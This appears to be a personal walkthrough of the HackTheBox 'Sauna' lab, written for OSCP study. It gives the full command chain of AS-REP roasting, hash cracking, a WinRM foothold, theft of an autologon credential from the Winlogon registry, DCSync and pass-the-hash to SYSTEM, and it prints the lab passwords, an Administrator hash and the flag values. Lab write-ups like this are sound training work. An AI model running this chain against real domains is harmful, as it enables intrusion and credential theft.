---
tags: [HTB, Sauna, Windows, ActiveDirectory, ASREPRoasting, DCSync, WinlogonAutologon, PassTheHash, Easy]
platform: HackTheBox
os: Windows Server 2019 Build 17763
hostname: SAUNA / SAUNA.EGOTISTICAL-BANK.LOCAL
difficulty: Easy
ip: $BoxIP
status: Complete
domain: EGOTISTICAL-BANK.LOCAL
---

# HTB: Sauna, Full Walkthrough

## The gist

Sauna is a Windows domain controller running IIS. Anonymous RPC, LDAP, and SMB enumeration returned little, so the website became the username source. Names from the About page produced a valid AS-REP roasting target. After cracking the ticket, WinRM provided a foothold. The foothold had no useful group membership or token privilege, but Winlogon stored an autologon credential. That service account had direct replication rights, so DCSync dumped the domain hashes. Pass-the-hash then provided a SYSTEM shell.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows Server 2019 Build 17763 |
| Hostname | SAUNA |
| Domain | `EGOTISTICAL-BANK.LOCAL` |
| Difficulty | Easy |
| IP | `$BoxIP` |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Full TCP scan | See section 1 below |
| 2 | Service and version scan | See section 2 below |
| 3 | Local setup | See section 3 below |
| 4 | Anonymous AD enumeration | See section 4 below |
| 5 | Website enumeration | See section 5 below |
| 6 | Kerberos clock handling | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Sauna`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName Sauna
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/Sauna
boxset Domain egotistical-bank.local
boxset FQDN sauna.egotistical-bank.local
boxset Username fsmith
boxset Username2 svc_loanmgr
boxset Password $Password
boxset Password2 $Password2
boxset AdminUser Administrator
boxset AdminHash $AdminHash
boxset Lport $Lport
```

Do not store real passwords, hashes, or flag values in a shared write-up.

## 1. Full TCP scan

I started with all TCP ports because domain controllers expose several services that a default scan can miss.

```bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oA $BoxDir/nmap/Sauna_allports
```

Open ports included 53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, and several dynamic RPC ports. Port 80 was the first clear place to look for the username source.



SCREENSHOT: Capture the completed all-port scan with the open-port list visible.

## 2. Service and version scan

I scanned the discovered ports to identify the web server and domain services.

```bash
sudo nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 $BoxIP -oA $BoxDir/nmap/Sauna_services
```

Important findings were IIS 10.0 on port 80, LDAP and LDAPS, Kerberos, SMB, WinRM, and Windows Server 2019 Build 17763. SMB signing was required. Nmap also reported a large clock difference, which mattered for Kerberos later.



SCREENSHOT: Capture the service scan showing IIS, LDAP, Kerberos, SMB, and WinRM.

## 3. Local setup

I recorded the domain and FQDN for later commands and added them to the local hosts file.

```bash
boxset Domain egotistical-bank.local
boxset FQDN sauna.egotistical-bank.local
echo "$BoxIP $Domain $FQDN" | sudo tee -a /etc/hosts
```

## 4. Anonymous AD enumeration

I checked anonymous RPC, LDAP, and SMB before using credentials. This tells me whether the directory exposes users or shares without authentication.

```bash
rpcclient -U '' -N $BoxIP -c 'enumdomusers'
ldapsearch -x -H ldap://$BoxIP -b "DC=egotistical-bank,DC=local"
smbclient -N -L //$BoxIP
```

RPC returned access denied. Anonymous LDAP bind was accepted but returned no useful users. SMB null authentication succeeded but exposed no useful shares. This was not a dead end. The next source was HTTP.

> [!warning] 💡 Hint
> **Watch out:** Empty anonymous AD results do not mean the box has no username path. Check the website for About, Team, or contact pages that list real names.

> [!tip] ⚡ More efficient path
> **What we did:** Tested anonymous RPC, LDAP, and SMB one after another before checking the website.
>
> **Faster approach:**
> ```bash
> rpcclient -U '' -N $BoxIP -c 'enumdomusers' & ldapsearch -x -H ldap://$BoxIP -b "DC=egotistical-bank,DC=local" & smbclient -N -L //$BoxIP & wait
> curl -s http://$BoxIP/ | tee $BoxDir/loot/index.html
> ```
> **Why:** The directory checks and the HTTP check do not depend on each other, so running them together reduces waiting.


SCREENSHOT: Capture the anonymous RPC, LDAP, and SMB results showing no useful directory data.

## 5. Website enumeration

I enumerated the IIS site and then read the About page because it was the most likely place for employee names.

```bash
feroxbuster -u http://$BoxIP/ -w /usr/share/wordlists/dirb/common.txt -x html,txt,php -t 30 -o $BoxDir/nmap/ferox.txt
curl -s http://$BoxIP/about.html
curl -s http://$BoxIP/about.html | tee $BoxDir/loot/about.html
```

The site listed Fergus Smith, Hugo Bear, Steven Kerb, Shaun Coins, Bowie Taylor, and Sophie Driver. I tested the common first-initial plus surname format and built a candidate list.

```bash
cat > $BoxDir/loot/users.txt << 'EOF'
administrator
fsmith
hbear
skerb
scoins
btaylor
sdriver
EOF
```


SCREENSHOT: Capture the employee names and the discovered web paths.

## 6. Kerberos clock handling

Kerberos rejects tickets when the client clock is too far from the domain controller. The scan showed roughly seven hours of skew, so I synchronised the local clock with the target.

```bash
sudo timedatectl set-ntp false && sudo ntpdate $BoxIP
```

> [!warning] 💡 Hint
> **Watch out:** A large clock difference breaks Kerberos even when the username and password are correct. Sync the clock first, and remember that the VPN may drop after the time step.

> [!tip] ⚡ More efficient path
> **What we did:** Changed the local system clock with sudo before running the Kerberos attack.
>
> **Faster approach:**
> ```bash
> FakeTime=$(ntpdate -q "$BoxIP" | awk 'NR==1{print $1" "$2}')
> faketime "$FakeTime" GetNPUsers.py "$Domain/" -dc-ip "$BoxIP" -usersfile "$BoxDir/loot/users.txt" -no-pass -request -format hashcat -outputfile "$BoxDir/loot/asrep.txt"
> ```
> **Why:** faketime runs only the Kerberos command with the target time, so it is useful when sudo is unavailable or changing the system clock would disrupt the VPN.

## 7. AS-REP roasting

AS-REP roasting requests a Kerberos response for accounts with pre-authentication disabled. The response can be cracked offline without logging in first.

```bash
faketime "$FakeTime" GetNPUsers.py "$Domain/" -dc-ip "$BoxIP" -usersfile "$BoxDir/loot/users.txt" -no-pass -request -format hashcat -outputfile "$BoxDir/loot/asrep.txt"
```

The command printed little useful output, but `fsmith` produced a ticket in the output file. I checked the file rather than relying on the terminal output.

```bash
sed -n '1p' $BoxDir/loot/asrep.txt
```

> [!warning] 💡 Hint
> **Watch out:** GetNPUsers can succeed quietly. Always inspect the output file for a captured AS-REP response.

> [!tip] ⚡ More efficient path
> **What we did:** Built a username file from the website and supplied it to GetNPUsers.
>
> **Faster approach:**
> ```bash
> faketime "$FakeTime" GetNPUsers.py "$Domain/" -dc-ip "$BoxIP" -no-pass -request -format hashcat -outputfile "$BoxDir/loot/asrep.txt"
> ```
> **Why:** If anonymous LDAP returns directory objects, GetNPUsers can obtain the domain user list itself and removes a manual list-building step.


SCREENSHOT: Capture the AS-REP output file or tool result without exposing the ticket value.

## 8. Offline password cracking

I cracked the AS-REP response locally. This does not send guesses to the domain.

```bash
hashcat -m 18200 $BoxDir/loot/asrep.txt /usr/share/wordlists/rockyou.txt
```

Hashcat recovered the password for `fsmith`. I stored the credential using the local helper without putting the password in this write-up.

```bash
boxset Username fsmith
boxset Password $Password
loot cred $Username $Password
```


SCREENSHOT: Capture the successful crack with the recovered password visible in this private vault.

## 9. Credential validation and foothold

I validated the cracked credential against SMB, WinRM, and LDAP before opening an interactive shell.

```bash
netexec smb $BoxIP -u $Username -p $Password -d $Domain
netexec winrm $BoxIP -u $Username -p $Password -d $Domain
netexec ldap $BoxIP -u $Username -p $Password -d $Domain
evil-winrm -i $BoxIP -u $Username -p $Password
```

WinRM provided a PowerShell shell as `egotisticalbank\fsmith` on SAUNA. The account was in Remote Management Users, Users, and Pre-Windows 2000 Compatible Access. Its listed privileges were not useful for escalation.

```powershell
whoami
hostname
whoami /groups
whoami /priv
Test-Path C:\Users\$env:USERNAME\Desktop\user.txt
```

The user flag path was confirmed, but its contents were intentionally not read.


SCREENSHOT: Capture credential validation, the foothold identity, and the flag path check. Do not capture flag contents.

## 10. Winlogon autologon credentials

The foothold did not provide a useful group or token-privilege path, so I checked common credential locations. Winlogon can store an autologon password so Windows can sign in automatically.

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword
```

The registry exposed an autologon entry. The displayed username was `svc_loanmanager`, but that was not the account's SAMAccountName. The password was also exposed in cleartext. Both values had to be validated against the domain.

> [!warning] 💡 Hint
> **Watch out:** Winlogon `DefaultUserName` is a display value and may not be the exact SAMAccountName used for authentication. Test the candidate with NetExec instead of copying the display value blindly.


SCREENSHOT: Capture the Winlogon query with the recovered password visible in this private vault.

## 11. Validate the service account

I first tested the registry username exactly as displayed. It failed. I then tested the shortened form of the registry display name, `svc_loanmgr`, which authenticated successfully.

```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain
netexec winrm $BoxIP -u $Username2 -p $Password2 -d $Domain
netexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domain
loot cred $Username2 $Password2
```


SCREENSHOT: Capture successful validation for the service account with the recovered password visible in this private vault.

## 12. Confirm replication rights

BloodHound can show the access-control path, but the important question was whether this account could replicate directory data. Collection confirmed the domain, users, groups, and computer objects, and the domain object showed direct `DS-Replication-Get-Changes-All` rights.

```bash
cd $BoxDir/loot
bloodhound-python -d $Domain -u $Username2 -p $Password2 -ns $BoxIP -c All --zip
cd $BoxDir
```

> [!warning] 💡 Hint
> **Watch out:** DCSync rights can be assigned directly to a service account. Do not assume every box needs an Account Operators to Exchange to ACL abuse chain.

> [!tip] ⚡ More efficient path
> **What we did:** Collected BloodHound data before testing the service account for a direct NTDS dump.
>
> **Faster approach:**
> ```bash
> netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds
> ```
> **Why:** A service account with replication-related naming or permissions may work immediately. This confirms the path before spending time loading a BloodHound database.


SCREENSHOT: Capture the BloodHound collection result and the direct replication-rights finding.

## 13. DCSync

NetExec used the service account's replication rights to request NTDS data from the domain controller.

```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds | tee $BoxDir/loot/ntds-output.txt
cp /home/kali/.nxc/logs/ntds/SAUNA_*/dcsync.ntds $BoxDir/loot/dcsync.ntds
```

The output included a warning that RemoteOperations failed with access denied, followed by a successful DRSUAPI dump. Seven domain hashes were recovered.

> [!warning] 💡 Hint
> **Watch out:** A RemoteOperations access-denied warning does not necessarily mean DCSync failed. DRSUAPI can still complete the directory replication request, so read the output after the warning.

Two accounts, HSmith and FSmith, had the same NTLM hash. That indicated password reuse and made the recovered Administrator hash usable for pass-the-hash.

> [!warning] 💡 Hint
> **Watch out:** Matching NTLM hashes mean two accounts use the same password. Treat hash reuse as a direct escalation clue and check the recovered privileged accounts.


SCREENSHOT: Capture the completed NTDS dump with hashes and passwords retained in this private vault.

## 14. Pass-the-hash and SYSTEM

I extracted the Administrator hash from the local NTDS output without printing its value. NetExec confirmed SMB access, then Impacket psexec created a temporary service and returned a SYSTEM shell.

```bash
AdminHash=$(awk -F: '$1 ~ /Administrator$/ {print $4}' $BoxDir/loot/dcsync.ntds)
netexec smb $BoxIP -u $AdminUser -H $AdminHash -x whoami
psexec.py -hashes ":$AdminHash" "$AdminUser@$BoxIP"
```

Inside the shell, `whoami` returned `nt authority\system`. The host was SAUNA. The root flag path was confirmed but its contents were not read.

> [!warning] 💡 Hint
> **Watch out:** `dir /a` is a cmd.exe switch and can fail when entered in a PowerShell prompt. Use `Get-ChildItem -Force` in PowerShell, or explicitly start cmd.exe.



SCREENSHOT: Capture the Administrator pass-the-hash validation and SYSTEM identity. Capture the root flag path only, never its contents.

## 15. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/AD - Service Scan]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/AD - AS-REP Roasting]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/AD - Local Credential Search]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/AD - DCSync Dump]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/AD - Pass the Hash]] -- technique used in this walkthrough

## 16. Collect the flags

- `user.txt`: `a9b5dea7daa4b842571a7493f673b72b` (value reproduced in the private sections above)
- `root.txt`: `0674ce6447f6a8b534d9714ca06c2049` (value reproduced in the private sections above)
- `proof.txt`: `0674ce6447f6a8b534d9714ca06c2049` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: a9b5dea7daa4b842571a7493f673b72b
root: 0674ce6447f6a8b534d9714ca06c2049
```

## 17. Clean down
No accounts were created and no target system files were permanently changed. The temporary psexec service and executable were removed when the shell exited.

```cmd
sc query $TempService
```

The verification returned service-not-found. The temporary WinPEAS file was stopped and removed from the target, and the local copy and temporary credential artifact were moved to trash. The local web server was stopped. The Winlogon registry and scheduled configuration were not modified.

### Completion checklist

- [x] Full TCP scan
- [x] Service and version scan
- [x] Anonymous RPC, LDAP, and SMB checks
- [x] Website username enumeration
- [x] AS-REP roasting and offline cracking
- [x] WinRM foothold
- [x] Winlogon autologon discovery
- [x] Direct replication-rights confirmation
- [x] DCSync
- [x] Pass-the-hash to SYSTEM
- [x] Clean-down and verification

## 18. Attack narrative in one page
1. [[OSCP/RUNBOOK V2/AD - Service Scan]] and anonymous enumeration mapped the domain controller.
2. [[OSCP/RUNBOOK V2/AD - AS-REP Roasting]] turned website-derived usernames into a crackable response.
3. [[OSCP/RUNBOOK V2/AD - Local Credential Search]] found a stored service credential after the WinRM foothold.
4. [[OSCP/RUNBOOK V2/AD - DCSync Dump]] and [[OSCP/RUNBOOK V2/AD - Pass the Hash]] recovered and validated domain administrator access.

## Tools used

- `nmap`
- `curl`
- `feroxbuster`
- `smbclient`
- `impacket`
- `evil-winrm`
- `sudo`
- `python`
- `powershell`
- `hashcat`

## Credentials and secrets

| Account | Source | Use |
|---|---|---|
| `fsmith` | AS-REP roasting | WinRM foothold |
| `svc_loanmgr` | Winlogon autologon registry | Replication access |
| `Administrator` | DCSync NTDS output | Pass-the-hash |

Passwords and hashes are reproduced in the private Credentials and secrets section above.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Sauna"
export BoxIP="10.129.95.180"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Sauna"
export Domain="egotistical-bank.local"
export DCip=""
export Username="fsmith"
export Password="Thestrokes23"
export Username2="svc_loanmgr"
export Password2="Moneymakestheworldgoround!"
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
fsmith:Thestrokes23
svc_loanmanager:Moneymakestheworldgoround!
svc_loanmgr:Moneymakestheworldgoround!
Administrator:823452073d75b9d1cf70ebdf86c7f98e
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
  -format hashcat \
$ [19:04:19] hashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt
kali@kali:~/Platforms/HackTheBox/Sauna [19:01:47] $ [?1h=[?2004hhashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txthashcatloot/asrep.txt /usr/share/wordlists/rockyou.txt[?1l>[?2004l
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Parsed Hashes: 1/1 (100.00%)
Hashes: 1 digests; 1 unique digests, 1 unique salts
* Passwords.: 14344385
Session..........: hashcat
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:52d4672...59d927
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
$ [19:05:51] boxset Password Thestrokes23
$ [19:06:09] netexec smb $BoxIP -u $Username -p $Password -d $Domain
$ [19:06:17] netexec winrm $BoxIP -u $Username -p $Password -d $Domain
$ [19:06:25] netexec ldap $BoxIP -u $Username -p $Password -d $Domain
kali@kali:~/Platforms/HackTheBox/Sauna [19:05:45] $ [?1h=[?2004hboxset Password Thestrokes23boxset[?1l>[?2004l
[+] Password=Thestrokes23 (saved to .env)
kali@kali:~/Platforms/HackTheBox/Sauna [19:05:57] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Sauna [19:06:10] $ [?1h=[?2004hnetexec winrm $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Sauna [19:06:18] $ [?1h=[?2004hnetexec ldap $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
$ [19:07:53] evil-winrm -i $BoxIP -u $Username -p $Password
mkali@kali:~/Platforms/HackTheBox/Sauna [19:06:26] $ [?1h=[?2004hevil-winrm -i $BoxIP -u $Username -p $Passwordevil-winrm[?1l>[?2004l
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
$ [19:11:22] loot flag user a9b5dea7daa4b842571a7493f673b72b
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword[?25h[?25l[?25h*Evil-WinRM* PS C:\Users\FSmith\Documents> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword
kali@kali:~/Platforms/HackTheBox/Sauna [19:11:15] $ [?1h=[?2004hloot flag user a9b5dea7daa4b842571a7493f673b72bloot[?1l>[?2004l
[+] Flag saved:  user = a9b5dea7daa4b842571a7493f673b72b  →  loot/flags.txt
$ [19:15:18] boxset Password2 'Moneymakestheworldgoround!'
$ [19:15:31] netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain
$ [19:15:40] netexec winrm $BoxIP -u $Username2 -p $Password2 -d $Domain
$ [19:15:47] netexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domain
kali@kali:~/Platforms/HackTheBox/Sauna [19:15:12] $ [?1h=[?2004hboxset Password2 'Moneymakestheworldgoround!'boxset'Moneymakestheworldgoround!'[?1l>[?2004l
[+] Password2=Moneymakestheworldgoround! (saved to .env)
kali@kali:~/Platforms/HackTheBox/Sauna [19:15:24] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username2 -p $Password2 -d $Domainnetexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Sauna [19:15:32] $ [?1h=[?2004hnetexec winrm $BoxIP -u $Username2 -p $Password2 -d $Domainnetexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Sauna [19:15:40] $ [?1h=[?2004hnetexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domainnetexec[?1l>[?2004l
$ [19:16:32] netexec smb $BoxIP -u svc_loanmgr -p $Password2 -d $Domain
$ [19:17:10] netexec winrm $BoxIP -u $Username2 -p $Password2 -d $Domain
$ [19:17:17] netexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domain
kali@kali:~/Platforms/HackTheBox/Sauna [19:15:47] $ [?1h=[?2004hnetexec smb $BoxIP -u svc_loanmgr -p $Password2 -d $Domainnetexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Sauna [19:17:04] $ [?1h=[?2004hnetexec winrm $BoxIP -u $Username2 -p $Password2 -d $Domainnetexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Sauna [19:17:10] $ [?1h=[?2004hnetexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domainnetexec[?1l>[?2004l
  -p $Password2 \
Do you want to run bloodhound-setup now? [Y/n] nnnetexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domain
kali@kali:~/Platforms/HackTheBox/Sauna [19:21:26] $ netexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domain                                                          sudo service postgresql startsudo service[?1l>[?2004l
$ [19:27:14] AdminHash=$(awk -F: '$1 ~ /Administrator$/ {print $4; exit}' loot/dcsync.ntds)
echo $AdminHash
$ [19:27:37] netexec smb $BoxIP -u Administrator -H $AdminHash -d $Domain
$ [19:28:00] loot cred Administrator $AdminHash
kali@kali:~/Platforms/HackTheBox/Sauna [19:27:03] $ [?1h=[?2004hAdminHash=$(awk -F: '$1 ~ /Administrator$/ {print $4; exit}' loot/dcsync.ntds)
echo $AdminHash$(awk'$1 ~ /Administrator$/ {print $4; exit}' loot/dcsync.ntds)
kali@kali:~/Platforms/HackTheBox/Sauna [19:27:14] $ [?1h=[?2004hnetexec smb $BoxIP -u Administrator -H $AdminHash -d $Domainnetexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Sauna [19:27:38] $ [?1h=[?2004hloot cred Administrator $AdminHashloot[?1l>[?2004l
$ [19:28:08] evil-winrm -i $BoxIP -u Administrator -H $AdminHash
39m:~/Platforms/HackTheBox/Sauna [19:28:00] $ [?1h=[?2004hevil-winrm -i $BoxIP -u Administrator -H $AdminHashevil-winrm[?1l>[?2004l
$ [19:30:54] loot flag root 0674ce6447f6a8b534d9714ca06c2049
kali@kali:~/Platforms/HackTheBox/Sauna [19:30:53] $ [?1h=[?2004hloot flag root 0674ce6447f6a8b534d9714ca06c2049loot[?1l>[?2004l
[+] Flag saved:  root = 0674ce6447f6a8b534d9714ca06c2049  →  loot/flags.txt
[?2004h*Evil-WinRM* PS C:\Users\FSmith\Documents> [?25l*Evil-WinRM* PS C:\Users\FSmith\Documents> [?25hzsh: killed     evil-winrm -i $BoxIP -u $Username -p $Password
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Sauna | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Anonymous AD enumeration can be empty while the website exposes the usernames needed for AS-REP roasting.
- Kerberos needs an accurate clock. Query the target time before troubleshooting valid credentials.
- Winlogon is worth checking when a foothold has no useful groups or privileges.
- Validate registry usernames with the domain because display names can differ from SAMAccountNames.
- DCSync depends on replication rights, not necessarily a long group-abuse chain.
- A warning from one DCSync method does not prove that the DRSUAPI operation failed.
- Reused NTLM hashes can turn one recovered account into a privileged pass-the-hash login.

- Website names can become useful AD usernames when anonymous directory enumeration is sparse.
- A valid service account may have replication rights even when it has no obvious local administrator privileges.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- shares a similar enumeration or escalation pattern

## External resources

- [HackTricks: AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproasting)
- [HackTricks: DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [HackTricks: Credentials from Windows Registry](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-from-registry)
- [PayloadsAllTheThings: Active Directory Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [Microsoft: Autologon](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
